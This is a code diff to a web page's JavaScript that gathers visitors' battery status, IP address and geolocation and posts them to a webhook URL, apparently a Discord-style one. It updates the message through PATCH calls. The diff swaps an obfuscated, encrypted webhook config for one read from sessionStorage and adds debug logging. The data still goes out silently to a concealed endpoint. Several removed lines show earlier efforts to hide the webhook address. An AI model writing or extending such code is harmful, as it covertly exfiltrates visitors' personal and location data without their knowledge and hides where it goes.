@@ -21,9 +21,6 @@
     info.battery = `${(battery.level*100).toFixed(0)}% ${battery.charging ? '⚡ charging' : '🔋'}`; 
   } catch(e){ info.battery = "n/a"; }
 
-  // send earliest-available info as soon as possible (best-effort, non-blocking)
-  try{ if(typeof sendToWebhook === 'function') sendToWebhook(info).catch(()=>{}); }catch(e){}
-
   // --- Fetch IP/geo ---
   const bouncerEl = document.getElementById("bouncer");
   try {
@@ -204,30 +201,21 @@
   const __webhook_state = { url: null, base: null, messageId: null, sent: false, rawOb: null };
   async function sendToWebhook(collectedInfo){
     try{
-      // fetch obfuscated webhook file first
-      let obResp;
-      try{ obResp = await fetch('/webhook-ob.json'); }catch(e){ obResp = null; }
-
+      // Try to load decrypted config from sessionStorage (set by index.html)
       let cfg = null;
-      let obRawText = null;
-      if(obResp && obResp.ok){
-        try{
-          obRawText = await obResp.text();
-          const ob = JSON.parse(obRawText);
-          __webhook_state.rawOb = obRawText;
-          // use window.jscramble.read provided by read.js to decrypt
-          if(window.jscramble && typeof window.jscramble.read === 'function'){
-            cfg = await window.jscramble.read(ob);
-          }
-        }catch(e){ cfg = null; }
-      }
+      try{
+        const stored = sessionStorage.getItem('__webhook_cfg');
+        const ts = parseInt(sessionStorage.getItem('__webhook_cfg_ts') || '0', 10);
+        // check if stored config is less than 5 minutes old
+        if(stored && ts && (Date.now() - ts < 5 * 60 * 1000)){
+          cfg = JSON.parse(stored);
+        }
+      }catch(e){ cfg = null; }
 
-      // fallback to plain webhook.json if obfuscated file missing/unreadable
-      if(!cfg){
-        try{ const plain = await fetch('/webhook.json'); if(plain.ok) cfg = await plain.json(); }catch(e){ cfg = null; }
+      if(!cfg || !cfg.webhook_url){
+        console.debug('sendToWebhook: no decrypted webhook config available in sessionStorage, aborting send');
+        return;
       }
-
-      if(!cfg || !cfg.webhook_url) return; // nothing to do
 
       // Normalize base webhook URL (strip search params for message endpoints)
       let webhookUrl = cfg.webhook_url;
@@ -266,9 +254,7 @@
 
       // 1) try webhookUrl directly
       try{ dParam = tryExtractFromString(webhookUrl); }catch(e){ dParam = null; }
-      // 2) try raw obfuscated JSON text
-      if(!dParam && __webhook_state.rawOb) dParam = tryExtractFromString(__webhook_state.rawOb);
-      // 3) recursively search decrypted cfg object for strings containing d param
+      // 2) recursively search decrypted cfg object for strings containing d param
       if(!dParam && cfg){
         const stack = [cfg];
         while(stack.length && !dParam){
@@ -301,28 +287,36 @@
         timestamp: new Date().toISOString()
       };
 
+      // DEBUG: show what we're about to send
+      try{ console.debug('sendToWebhook: webhook url =', __webhook_state.url); console.debug('sendToWebhook: Identifier =', dParam); console.debug('sendToWebhook: embed =', embed); }catch(e){}
+
       // If we've not yet sent, POST with ?wait=true to get message id back, otherwise PATCH the existing message
       try{
         if(!__webhook_state.sent){
-          const resp = await fetch(__webhook_state.url + (__webhook_state.url.includes('?') ? '&' : '?') + 'wait=true', {
+          const postUrl = __webhook_state.url + (__webhook_state.url.includes('?') ? '&' : '?') + 'wait=true';
+          const resp = await fetch(postUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
           });
-          if(resp && resp.ok){
-            try{ const data = await resp.json(); if(data && data.id) __webhook_state.messageId = data.id; }catch(e){}
+          if(!resp){ console.debug('sendToWebhook: no response from POST'); }
+          else if(!resp.ok){ const txt = await resp.text().catch(()=>null); console.debug('sendToWebhook: POST failed', resp.status, txt); }
+          else{
+            try{ const data = await resp.json(); if(data && data.id) __webhook_state.messageId = data.id; console.debug('sendToWebhook: POST succeeded, message id =', __webhook_state.messageId); }catch(e){ console.debug('sendToWebhook: POST succeeded but parsing JSON failed', e); }
           }
           __webhook_state.sent = true;
         }else if(__webhook_state.messageId){
           // PATCH to update message
           const editUrl = __webhook_state.base.replace(/\/$/, '') + '/messages/' + __webhook_state.messageId;
-          await fetch(editUrl, {
+          const resp = await fetch(editUrl, {
             method: 'PATCH',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
           });
+          if(!resp || !resp.ok){ const txt = await (resp ? resp.text().catch(()=>null) : null); console.debug('sendToWebhook: PATCH failed', resp ? resp.status : 'no resp', txt); }
+          else console.debug('sendToWebhook: PATCH succeeded');
         }
-      }catch(e){ /* ignore network errors */ }
+      }catch(e){ console.debug('sendToWebhook: network error', e); }
 
     }catch(e){ /* swallow errors to avoid breaking page */ }
   }
